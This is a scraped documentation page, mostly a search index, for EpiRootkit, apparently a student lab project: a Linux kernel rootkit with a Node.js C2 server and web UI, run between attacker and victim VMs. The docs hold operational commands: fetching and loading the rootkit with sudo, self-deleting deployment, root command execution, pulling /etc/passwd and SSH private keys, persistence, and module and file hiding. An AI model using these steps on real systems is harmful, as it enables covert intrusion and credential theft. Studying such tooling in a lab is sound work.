</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/05-epirootkit/deployment/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Build & Deployment</p><p class="card-text ms-2">How to build and load â€¦</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/05-epirootkit/features/command-execution/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Command Execution <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">Execute shell commands â€¦</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>Â© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/docs\/01-introduction\/presentation\/",
                title: "Presentation",
                description: "whoami",
                content: "PrÃ©sentation linkEquipage link Capitaine: Hugo Sibony Responsable Sabordage et mutinerie: LÃ©a Bonet Nom de lâ€™Ã©quipe linkNous sommes Tux Fan Club ðŸ§\nCâ€™est LÃ©a qui a choisi le nom car câ€™est la seule personne du groupe un peu crÃ©ative ðŸ‘€\n(Et par ce que Hugo est gentleman et a laissÃ© le choix a la seule femme du groupe)\nTux est un manchot reprÃ©sentant le noyau Linux. Il a Ã©tÃ© crÃ©e en 1996 par Larry Ewing sur GIMP\nVu quâ€™il est mignon et que je lâ€™aime (Tux pas Hugo ðŸ‘€) je me suis dis que Tux Fan Club Ã©tait un nom convenable\n"
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/docs\/02-setup\/",
                title: "Setup",
                description: "Environment and Virtual Machine setup instructions",
                content: "Overview linkThis section guides you through setting up your host environment, installing and verifying VM disks, and configuring the attacker and victim VMs.\nInitial Setup \u0026 Installation VM Installation \u0026 Verification Attacking VM Setup Victim VM Setup "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/02-setup\/environment\/",
                title: "Host Environment Setup",
                description: "Prepare your host system for running EpiRootkit VMs",
                content: "Host Environment Setup link Purpose: Configure Ubuntu 24.10 host to run attacker and victim VMs. The actual EpiRootkit components run INSIDE the VMs.\nSetup Method link Automated Setup (Recommended) Manual Step-by-Step One-Command Installation linkRun the automated setup script to install all dependencies:\n./scripts/install_dependencies.sh What it installs:\nQEMU/KVM: Virtual machine hypervisor libvirt: VM management daemon and tools Bridge utils: Network bridge configuration User permissions: Adds you to libvirt group 1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install VM Management Tools link sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils 3. Configure Libvirt link # Enable and start libvirt daemon sudo systemctl enable --now libvirtd # Add current user to libvirt group sudo usermod -aG libvirt $USER # Activate group membership (required before using VMs) newgrp libvirt 4. Optional: Documentation Tools link # Only if you want to build docs locally sudo apt install -y hugo Verification linkAfter completing either setup method, verify your installation:\n# Check VM management tools virsh list --all qemu-system-x86_64 --version # Verify KVM support lsmod | grep kvm # Should show: kvm_intel (or kvm_amd) and kvm # Check hardware virtualization egrep -c '(vmx|svm)' /proc/cpuinfo # Should be \u003e= 1 (if 0, enable in BIOS) # Verify KVM device access ls -la /dev/kvm # Should be accessible by libvirt group Next Steps link VM Setup: "
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/docs\/02-setup\/vm-installation\/",
                title: "VM Installation \u0026 Verification",
                description: "Set up and verify the attacker and victim VMs from scratch.",
                content: "Virtual Machine Installation \u0026 Verification link You must have completed "
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/docs\/02-setup\/attacking-vm-setup\/",
                title: "Attacker VM Setup",
                description: "Configure the attacking VM with C2 server and web interface",
                content: "Attacker VM Setup linkConfigure the attacking VM with Node.js C2 server and React web interface.\nPrerequisites link Host setup complete: Host Environment Setup VM downloaded: vm/attacker.qcow2 in project root VM launched: sudo ./scripts/run_vms.sh attacker VM Access linkConnection Details:\nIP Address: 192.168.200.11 (static) Username: attacker Password: jules Auto-login: Enabled (no password prompt) Setup Method link Pre-built Disk (Recommended) Self-build from Scratch Quick Start linkEverything is already set up, so you can immediately build and run:\n# Inside attacker VM (already logged in) cd epirootkit # Build rootkit payload for victim deployment cd rootkit \u0026\u0026 make clean \u0026\u0026 make ls -la epirootkit.ko # âœ… Compiled payload ready # Start C2 server cd ../attacking_program \u0026\u0026 pnpm install \u0026\u0026 pnpm start # âœ… C2 server started on port 4444 # âœ… Web interface started on port 3000 Ready to Use link Web Interface: http://192.168.200.11:3000 File transfer: Ready to deploy payload to victim VM Fresh VM Setup linkIf using a fresh Ubuntu VM, you MUST first install dependencies on the attacker VM:\nâš ï¸ Required for Fresh VMs: Run ./scripts/setup_attacker.sh inside the attacker VM to install Node.js, npm, pnpm, gcc, and other dependencies.\nChoose your preferred setup method:\nMethod 1: Automated (Recommended) linkOne-Command Setup from Host Run this from your host machine (not inside the VM):\n# From host project directory ./scripts/deploy_to_attacker.sh # âœ… Transfers project files to VM # âœ… Runs setup_attacker.sh remotely # âœ… Installs all dependencies # ðŸŽ‰ Ready to build and start Build and Start SSH into the VM and complete setup:\n# SSH into attacker VM ssh attacker@192.168.200.11 # Build rootkit and start C2 server cd epirootkit/rootkit \u0026\u0026 make clean \u0026\u0026 make cd ../attacking_program \u0026\u0026 pnpm install \u0026\u0026 pnpm start # âœ… Web interface: http://192.168.200.11:3000 Method 2: Manual Step-by-Step link1. Transfer Project Files First, get the EpiRootkit project into the VM.\nðŸ“– Complete Guide: "
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/docs\/02-setup\/victim-vm-setup\/",
                title: "Victim VM Setup",
                description: "Configure the victim VM and deploy the EpiRootkit",
                content: "Victim VM Setup linkDeploy the EpiRootkit kernel module on the victim system.\nPrerequisites link Host setup complete: Host Environment Setup VM downloaded: vm/victim.qcow2 in project root VM launched: sudo ./scripts/run_vms.sh victim VM Access linkConnection Details:\nIP Address: 192.168.200.10 (static) Username: victim / Password: jules Target: Ubuntu 20.04 LTS with kernel 5.4.0 Deployment Process link1. Receive Payload linkGet the rootkit files from the attacker VM:\n# Option A: HTTP download wget http://192.168.200.11:8080/epirootkit.ko wget http://192.168.200.11:8080/deploy_rootkit.sh # Option B: SCP transfer # Files transferred by attacker to victim@192.168.200.10:~/ # Option C: Web UI upload # Use attacker's web interface file transfer panel 2. Deploy Rootkit link # Basic deployment (connects to 192.168.200.11:4444) sudo ./deploy_rootkit.sh # Custom C2 server sudo ./deploy_rootkit.sh address=IP port=PORT # Stealth deployment (self-destructs) sudo ./deploy_rootkit.sh --self-delete 3. Verify Connection linkSwitch to attacker VM C2 server:\nc2-server$ ls # â€¢ Client-1 - UNAUTHENTICATED - Last seen: Just now c2-server$ auth Client-1 password c2-server$ exec Client-1 whoami # Exit code: 0, Output: root Management link # Check status sudo ./deploy_rootkit.sh status # Remove rootkit sudo ./deploy_rootkit.sh uninstall For detailed deployment script options, see EpiRootkit Deployment.\n"
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/docs\/02-setup\/file-transfer\/",
                title: "Host to VM File Transfer",
                description: "Methods for transferring files from host to QEMU VMs",
                content: "Host to VM File Transfer linkGuide for transferring files from the host system to QEMU virtual machines.\nTransfer Methods link Automated Script (Recommended) Manual SCP/SSH HTTP Server Other Methods One-Command Transfer linkFor attacker VM setup, use the automated deployment script:\n# From host project directory ./scripts/deploy_to_attacker.sh # âœ… Transfers entire project via SSH/SCP # âœ… Runs setup script remotely # âœ… Installs all dependencies # ðŸŽ‰ Ready to build and start What It Does link Checks connectivity: VM reachable via SSH Transfers files: Complete project to ~/epirootkit Runs setup: Executes dependency installation Verifies: All components ready Requirements link VM running with SSH enabled Network connectivity between host and VM VM credentials: attacker@192.168.200.11 (password: jules) Enable SSH in VM link # Inside the VM sudo apt update \u0026\u0026 sudo apt install -y openssh-server sudo systemctl enable --now ssh Transfer Files link # From host to VM scp -r /path/to/epirootkit attacker@192.168.200.11:~/ # Transfer specific files scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/ Setup Server on Host link # From project directory cd /path/to/epirootkit python3 -m http.server 8080 Download in VM link # Inside VM wget http://192.168.200.1:8080/filename # Download entire project wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/ Shared Folders (Development) linkAdd to QEMU launch:\n-virtfs local,path=/path/to/host/folder,mount_tag=shared,security_model=passthrough Mount in VM:\nsudo mkdir -p /mnt/shared sudo mount -t 9p -o trans=virtio shared /mnt/shared cp -r /mnt/shared/epirootkit ~/ "
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/docs\/03-attacking-program\/",
                title: "Attacking Program (C2 Server)",
                description: "C2 server for EpiRootkit management with CLI interface and Web UI",
                content: ""
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/docs\/03-attacking-program\/overview\/",
                title: "Overview",
                description: "C2 server architecture and capabilities",
                content: "C2 Server Overview linkCommand \u0026 Control server for managing EpiRootkit connections.\nQuick Start link cd attacking_program pnpm install pnpm start Ports:\nC2 Server: 4444 Web Interface: 3000 Architecture link CLI Interface: Interactive command system C2 Server: TCP server for rootkit connections Web Interface: REST API with Socket.IO Client Manager: Connection lifecycle and authentication Event System: Real-time logging Technology Stack link Runtime: Node.js 18+ with pnpm CLI: Vorpal.js for commands Web: Express.js + Socket.IO Encryption: XOR cipher with 32-byte hardcoded key Core Features linkClient Management link ls # List connected clients auth Client-1 password # Authenticate with client status Client-1 # Get rootkit status keepalive Client-1 # Check connection health Remote Operations link exec Client-1 whoami # Execute commands upload Client-1 ./file.txt /tmp/file.txt # Upload files download Client-1 /etc/passwd ./passwd # Download files Configuration link config Client-1 # Interactive configuration persist Client-1 install # Manage persistence Authentication linkSHA-512 Password System link C2 sends plaintext password Rootkit hashes and compares Session established (1-hour timeout) Rate limiting: 5 attempts/60 seconds Default Credentials:\nPassword: password Hash: b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 Configuration linkEnvironment Settings link C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port ENCRYPTION_KEY=secret32hex # 32-character hex key ENABLE_ENCRYPTION=true # XOR encryption toggle PASSWORD_HASH=hash # SHA-512 password hash Security Features link Authentication: SHA-512 with brute force protection XOR Encryption: 32-byte key cipher for traffic obfuscation Session Management: Automatic timeout and cleanup Access Control: Commands require authentication Health Monitoring: Automatic stale client detection Network Protocol linkCommand Format link { \"type\": \"command\", \"command\": \"exec\", \"data\": \"whoami\" } Response Format link { \"type\": \"response\", \"success\": true, \"data\": \"root\" } "
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/docs\/03-attacking-program\/installation\/",
                title: "Installation",
                description: "Install and configure the C2 attacking program",
                content: "Installation linkPrerequisites linkBefore installing the attacking program, ensure you have:\nNode.js 14+ and npm (installed via setup script) Linux environment (Ubuntu recommended) Network access between attacker and victim machines Quick Start link1. Automatic Setup (Recommended) linkIf youâ€™re using the pre-built attacker VM or have run the setup script:\n# Navigate to attacking program directory cd attacking_program # Install dependencies npm install # Start the C2 server npm start The server will start on:\nC2 Server: localhost:4444 (for client connections) Web Interface: localhost:3000 (for operator access) 2. Manual Installation linkFor fresh systems or custom setups:\n# Install system dependencies sudo apt update sudo apt install -y nodejs npm gcc make linux-headers-$(uname -r) # Navigate to project directory cd attacking_program # Install Node.js dependencies npm install # Start the server npm start Configuration linkEnvironment Variables linkCreate a .env file in the attacking_program directory:\n# Server Configuration C2_PORT=4444 WEB_PORT=3000 AUTH_PASSWORD=password # Security Settings ENCRYPTION_KEY=your-32-character-encryption-key JWT_SECRET=your-jwt-secret-key # Upload Settings UPLOAD_DIR=./uploads MAX_FILE_SIZE=50MB Custom Configuration linkEdit src/config/index.js for custom settings:\nmodule.exports = { C2_PORT: process.env.C2_PORT || 4444, WEB_PORT: process.env.WEB_PORT || 3000, AUTH_PASSWORD: process.env.AUTH_PASSWORD || 'password', // ... other settings }; Production Deployment link # Install only production dependencies npm install --production # Start the server cd attacking_program \u0026\u0026 npm start Next Steps linkOnce installed:\nLearn how to use the attacking program Set up the rootkit Access the web interface "
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/docs\/03-attacking-program\/commands\/",
                title: "Command Reference",
                description: "Complete reference for all C2 server commands",
                content: "Command Reference linkComplete reference for all C2 server commands.\nCommand List link Command Description Auth Required clients, ls List connected clients No auth Authenticate with client No exec Execute shell commands Yes upload [remote] Upload files to victim Yes download [local] Download files from victim Yes status Get rootkit status Yes keepalive Check connection status Yes persist [action] Manage persistence Yes config Interactive configuration Yes Client Management linkList Clients link ls # List all connected clients # â€¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # â€¢ Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM Authentication link auth Client-1 password # Authenticate with client # âœ“ [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful auth Client-1 wrongpass # Wrong password # ERROR: Authentication failed Security Features:\nSHA-512 password hashing Rate limiting (5 attempts/60 seconds) Session timeout (1 hour) Command Execution link exec Client-1 whoami exec Client-1 uname -a exec Client-1 ps aux | head -5 Features:\nRoot privileges execution Full stdout/stderr capture Exit code display Real-time output File Transfer link # Upload files upload Client-1 ./file.txt /tmp/file.txt # Upload to specific path upload Client-1 ./script.sh # Upload to current directory # Download files download Client-1 /etc/passwd ./passwd # Download to specific path download Client-1 /etc/hostname # Download to current directory Features:\nBase64 encoding Path validation Binary/text file support Automatic path resolution System Information linkStatus Check link status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Connection: CONNECTED # Module Hidden: YES # File Hiding: YES # Persistence: ENABLED Connection Check link keepalive Client-1 # Keepalive Status: # Last ping: 2025-05-25 16:14:00 # Last pong: 2025-05-25 16:14:00 # Failed pings: 0 # Connection: STABLE Persistence Management link persist Client-1 install # Install all mechanisms persist Client-1 remove # Remove all mechanisms persist Client-1 modules # modules-load.d only Configuration linkInteractive Config link config Client-1 # â”Œâ”€ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # # ? Select option: [Use arrow keys] Available Settings:\nModule hiding toggle File hiding toggle Persistence management Connection parameters Direct Commands link hide_module Client-1 # Hide rootkit module unhide_module Client-1 # Show rootkit module hide_files Client-1 # Enable file hiding unhide_files Client-1 # Disable file hiding Error Handling linkFor detailed usage examples, see "
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/docs\/03-attacking-program\/usage\/",
                title: "Usage \u0026 Workflows",
                description: "Usage scenarios and workflows",
                content: "Usage Guide linkComplete workflows for the EpiRootkit C2 server.\nQuick Start link1. Start C2 Server link cd attacking_program pnpm start # âœ“ Server started on port 4444 # âœ“ Web interface started on port 3000 2. Install Rootkit (Victim) link sudo insmod epirootkit.ko # C2 server shows: âœ“ Client-1 Connected 3. Authenticate link auth Client-1 password # âœ“ [2025-05-25 16:13:30] Authenticated # SUCCESS: Authentication successful Basic Workflows linkClient Management link # List clients ls # â€¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # â€¢ Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM # Check status status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Module Hidden: YES # Persistence: ENABLED # Monitor connection keepalive Client-1 # Last ping: 2025-05-25 16:14:00 # Connection: STABLE Command Execution link # System reconnaissance exec Client-1 whoami # Exit code: 0 # Output: root exec Client-1 uname -a # Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux exec Client-1 ps aux | head -5 # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # Network information exec Client-1 ip addr show exec Client-1 netstat -tuln File Transfer link # Upload files upload Client-1 ./script.sh /tmp/script.sh # âœ“ File uploaded successfully (512 bytes) exec Client-1 chmod +x /tmp/script.sh exec Client-1 /tmp/script.sh # Download files download Client-1 /etc/passwd ./passwd # âœ“ File downloaded successfully (2048 bytes) download Client-1 /home/user/.ssh/id_rsa ./keys/ # âœ“ File downloaded successfully (1679 bytes) Advanced Workflows linkPersistence Setup link # Install all persistence mechanisms persist Client-1 install # SUCCESS: All persistence mechanisms installed # Test persistence (victim reboots) exec Client-1 reboot # Wait for reconnection... ls # â€¢ Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED (survived reboot) Stealth Operations link # Check current stealth status status Client-1 # Module Hidden: YES # File Hiding: YES # Test module hiding exec Client-1 lsmod | grep epirootkit # (no output - module hidden) # Test file hiding exec Client-1 touch /tmp/epirootkit_test exec Client-1 ls /tmp/ | grep epirootkit # (no output - file hidden) # But file still accessible exec Client-1 cat /tmp/epirootkit_test # (works normally) Configuration Management link # Interactive configuration config Client-1 # â”Œâ”€ Configuration - Client-1 # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # Direct commands hide_module Client-1 # SUCCESS: Module hidden unhide_module Client-1 # SUCCESS: Module visible hide_files Client-1 # SUCCESS: File hiding enabled "
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/docs\/04-web-ui\/",
                title: "Web UI (C2 Frontend)",
                description: "Modern React-based web interface for EpiRootkit C2 server management",
                content: ""
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/docs\/04-web-ui\/overview\/",
                title: "Overview",
                description: "Modern web interface for EpiRootkit C2 server",
                content: "Web UI Overview linkModern React-based web interface for EpiRootkit C2 management.\nQuick Start link # Start system (includes Web UI) ./deploy_c2.sh # Access Web UI # URL: http://localhost:3000 # Password: password Architecture linkFrontend Technology Stack:\nFramework: React 18 + Vite Styling: Tailwind CSS + shadcn/ui components State: React Context + hooks Real-time: WebSocket connections via Socket.IO Authentication: JWT tokens with session management Core Features link Dashboard: Real-time client monitoring and statistics Authentication: Secure login with JWT tokens Client Management: Visual client cards with status indicators Interactive Panels: Terminal, file transfer, configuration, logs Real-time Updates: Live WebSocket synchronization User Interface linkMain Components link Login Screen: JWT authentication Dashboard: Client overview with search and filtering Client Cards: Visual representation of connected rootkits Panel System: Tabbed interface for different operations Panel Types link Terminal Panel: Command execution interface Upload/Download Panel: File transfer with drag-drop Configuration Panel: Toggle rootkit settings Authentication Panel: Client authentication management Event Log Panel: Real-time activity monitoring Integration linkThe Web UI integrates with the "
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/docs\/04-web-ui\/installation\/",
                title: "Installation \u0026 Setup",
                description: "How to install and launch the Web UI",
                content: "Web UI Installation linkThe Web UI is integrated with the C2 server and launches automatically.\nQuick Setup link # From project root ./deploy_c2.sh This starts both the C2 server and Web UI simultaneously.\nAccess link URL: http://localhost:3000 Default Password: password Features: All C2 functionality via web interface Manual Installation linkIf you need to install dependencies manually:\ncd attacking_program pnpm install pnpm start For detailed configuration options, see "
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/docs\/04-web-ui\/features\/",
                title: "Features",
                description: "Web UI capabilities and components",
                content: ""
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/docs\/04-web-ui\/features\/authentication\/",
                title: "Authentication",
                description: "Secure login with JWT tokens and session management",
                content: "Authentication linkSecure login with JWT tokens and automatic session management.\nFeatures link JWT Authentication: Secure token-based login system Auto-logout: Automatic logout when session expires (1 hour) Client Authentication: Authenticate individual rootkit clients Persistent Sessions: Survives browser refresh "
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/docs\/04-web-ui\/features\/dashboard\/",
                title: "Dashboard",
                description: "Real-time client monitoring and statistics",
                content: "Dashboard linkMain interface for monitoring connected rootkit clients with real-time statistics.\nFeatures link Live Statistics: Total, active, and authenticated client counts Grid/Table Views: Switch between visual cards and detailed table Real-time Search: Filter clients by ID, IP, or status Status Indicators: Color-coded connection states (Green/Yellow/Red) Quick Actions: One-click authentication and client management "
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/docs\/04-web-ui\/features\/client-management\/",
                title: "Client Management",
                description: "Monitor and interact with connected rootkit clients",
                content: "Client Management linkMonitor and interact with connected rootkit clients in real-time.\nFeatures link Connection Status: Visual indicators (Green/Yellow/Red) for client state Client Authentication: Secure password-based client authentication Real-time Updates: Live connection and status changes via WebSocket Client Information: ID, IP address, last seen timestamps Health Monitoring: Automatic stale client detection and alerts "
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/docs\/04-web-ui\/features\/panels\/terminal-panel\/",
                title: "Terminal Panel",
                description: "Remote command execution interface with terminal emulation",
                content: "Terminal Panel linkFull terminal emulator for remote command execution with history and real-time output.\nFeatures link Command History: Navigate with â†‘/â†“ arrow keys Real-time Output: Live command execution streaming Quick Commands: One-click shortcuts for common operations Status Indicators: Visual execution and connection status Parsed Display: Output without C2 metadata "
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/docs\/04-web-ui\/features\/panels\/",
                title: "UI Panels",
                description: "Individual Web UI panel components",
                content: "UI Panels linkInteractive panel components for EpiRootkit Web UI operations.\nAvailable Panels linkEach panel provides specific functionality for managing rootkit clients:\n"
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/docs\/04-web-ui\/features\/panels\/persistence-panel\/",
                title: "Persistence Panel",
                description: "Boot persistence configuration and management",
                content: "Persistence Panel linkConfigure rootkit boot survival with multiple persistence methods and one-click setup.\nFeatures link Module System Boot: systemd modules-load.d (recommended) Cron Scheduled Task: Periodic 5-minute checks Profile Login Trigger: Shell profile modification Quick Setup: One-click recommended installation Status Indicators: Visual active/inactive states "
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/docs\/04-web-ui\/features\/panels\/event-log-panel\/",
                title: "Event Log Panel",
                description: "Activity and event monitoring interface",
                content: "Event Log Panel linkReal-time activity monitoring with filtering, search, and export capabilities.\nFeatures link Real-time Events: Connection, authentication, and command events Event Filtering: Filter by type, category, and time period Search Functionality: Text search with regex support Export Logs: Download events as JSON for analysis Color Coding: Visual event type identification "
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/docs\/04-web-ui\/features\/panels\/upload-download-panel\/",
                title: "Upload/Download Panel",
                description: "File transfer interface with drag-and-drop support",
                content: "Upload/Download Panel linkFile transfer interface with drag-and-drop upload and remote file browser.\nFeatures link Drag-and-Drop Upload: Large drop zone for easy file uploads Remote File Browser: Navigate and download from target filesystem Progress Tracking: Real-time transfer progress bars Transfer History: Track all upload/download operations Error Handling: Error messages and retry options "
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/docs\/04-web-ui\/features\/panels\/overview-panel\/",
                title: "Overview Panel",
                description: "Client status and quick actions dashboard with stealth monitoring",
                content: "Overview Panel linkClient status dashboard with connection monitoring, stealth feature status, and quick action buttons.\nFeatures link Connection Status: Real-time health and connection indicators Authentication Status: Session state and security level Stealth Status: Module hiding, file hiding, and line hiding indicators System Information: Client ID, IP address, and OS details Quick Actions: One-click authentication and management Visual Indicators: Color-coded status with progress animations "
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/docs\/04-web-ui\/features\/panels\/configuration-panel\/",
                title: "Configuration Panel",
                description: "Rootkit settings and configuration management",
                content: "Configuration Panel linkManage rootkit stealth settings with toggle switches and real-time updates.\nFeatures link Module Hiding: Toggle rootkit visibility in system File Hiding: Toggle rootkit file hiding from filesystem listing Line Hiding: Toggle rootkit line hiding from file contents Real-time Updates: Changes applied immediately Status Indicators: Visual feedback for all settings Controls linkEach configuration option provides:\nToggle Button: Enable/Disable functionality Status Display: Current state (Enabled/Disabled/Unknown) Visual Indicators: Color-coded status icons Loading States: Progress feedback during changes "
            }
        );
    index.add(
            {
                id:  26 ,
                href: "\/docs\/04-web-ui\/features\/panels\/authentication-panel\/",
                title: "Authentication Panel",
                description: "Client authentication management and security interface",
                content: "Authentication Panel linkSecure two-layer authentication system for rootkit client access and control.\nHow It Works linkThe authentication system has two layers:\nWeb UI Login: JWT authentication to access the C2 interface Client Authentication: Per-client password authentication for rootkit control Client Authentication Process link When you click â€œAuthenticateâ€ on a client card:\nModal opens: Password input dialog appears Credential submission: Password sent to rootkit client via C2 server Rootkit verification: Client validates password against stored hash Session establishment: Authenticated session created for client operations Security Features link Password hashing: SHA-512 verification on client side Session timeout: Authentication expires after inactivity Per-client auth: Each client requires individual authentication Failed attempt tracking: Monitor and log authentication failures Secure transmission: Encrypted credential transfer via C2 channel "
            }
        );
    index.add(
            {
                id:  27 ,
                href: "\/docs\/05-epirootkit\/",
                title: "EpiRootkit",
                description: "Linux kernel rootkit implementation for kernel 5.4.0",
                content: ""
            }
        );
    index.add(
            {
                id:  28 ,
                href: "\/docs\/05-epirootkit\/configuration-justifications\/",
